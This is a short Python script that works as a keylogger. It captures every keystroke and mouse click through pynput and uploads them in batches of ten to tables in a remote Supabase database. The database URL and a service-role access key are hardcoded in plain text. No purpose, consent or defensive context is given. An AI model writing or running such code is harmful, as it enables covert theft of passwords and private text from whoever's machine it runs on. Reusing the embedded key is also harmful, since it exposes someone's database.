import logging
import sys
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener, Key
from supabase import create_client, Client

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

url = "https://gurjbecyjphjhrhihnwv.supabase.co"
key = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd1cmpiZWN5anBoamhyaGlobnd2Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTA2NDI3NSwiZXhwIjoyMDYwNjQwMjc1fQ.ITRY-7aTl_M8eltm_MacrD_t3JeC2MBVBEzF8ae6J-g")
supabase: Client = create_client(url, key)

keys = []
mouse = []

def on_press(key):
    try:
        logger.info(f"Key pressed: {key}")
        keys.append(str(key))
        
        if len(keys) >= 10:
            response = (
                supabase.table("Keys")
                .insert({"buttons": keys})
                .execute()
            )
            logger.info(f"Uploaded keys: {keys}")
            keys.clear()
            
        if key == Key.f9:
            logger.info("F9 pressed, stopping listeners and clearing buffers")
            keys.clear()
            mouse.clear()
            mouse_listener.stop()
            keyboard_listener.stop()
            sys.exit(0)
            
    except Exception as e:
        logger.error(f"Error in on_press: {e}")
        mouse_listener.stop()
        keyboard_listener.stop()
        sys.exit(1)

def on_click(x, y, button, pressed):
    try:
        logger.info(f"Mouse {'pressed' if pressed else 'released'} at ({x}, {y}) with {button}")
        mouse.append({"x": x, "y": y, "Button": str(button), "Pressed": pressed})
        
        if len(mouse) >= 10:
            response = (
                supabase.table("Mouse")
                .insert({"Data": str(mouse)})
                .execute()
            )
            logger.info(f"Uploaded mouse data: {mouse}")
            mouse.clear()
    except Exception as e:
        logger.error(f"Error in on_click: {e}")

keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener = MouseListener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
